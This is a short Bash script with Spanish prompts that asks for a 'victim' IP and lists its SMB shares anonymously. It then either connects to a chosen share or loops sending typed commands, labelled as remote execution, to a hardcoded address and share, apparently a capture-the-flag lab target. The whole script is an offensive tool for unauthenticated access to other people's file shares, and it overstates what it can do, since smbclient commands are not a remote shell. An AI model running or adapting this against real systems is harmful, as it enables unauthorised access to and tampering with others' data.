#!/bin/bash

# Colores

clear

greenCl="\e[0;32m\033[1m"
endCl="\033[0m\e[0m"
redCl="\e[0;31m\033[1m"
blueCl="\e[0;34m\033[1m"
yellowCl="\e[0;33m\033[1m"
purpleCl="\e[0;35m\033[1m"
turquoiseCl="\e[0;36m\033[1m"
grayCl="\e[0;37m\033[1m"

read -p "$(echo -e "${grayCl}Ingresa la IP victima: ${endCl}" )" ip_victima

smbclient -L ////$ip_victima// -N

read -p "$(echo -e "\n${grayCl}Disco que deseas seleccionar: ${endCl}")" opcion_disco

function Pregunta(){

read -p "$(echo -e "\n${grayCl}Deseas ejecutar remotamente comandos yay/nay: ${endCl}")" yay_nay

  if [ $yay_nay == "yay" ];  then
    
    clear

    function ejecucion_remota(){

    read -p "$( echo -e "${grayCl}Comando remoto --> ${endCl}")" Comando

    echo

    smbclient //10.10.42.247/nt4wrksv -N -c "${Comando}"

    echo 

    ejecucion_remota

    }

    ejecucion_remota

  elif [ $yay_nay == "nay" ]; then 

    clear
    smbclient --no-pass //$ip_victima/$opcion_disco 

  else
    
    clear
    echo -e "${redCl}[!] Opcion no valida${endCl}"
    sleep 1
    clear
    Pregunta

  fi

}

Pregunta
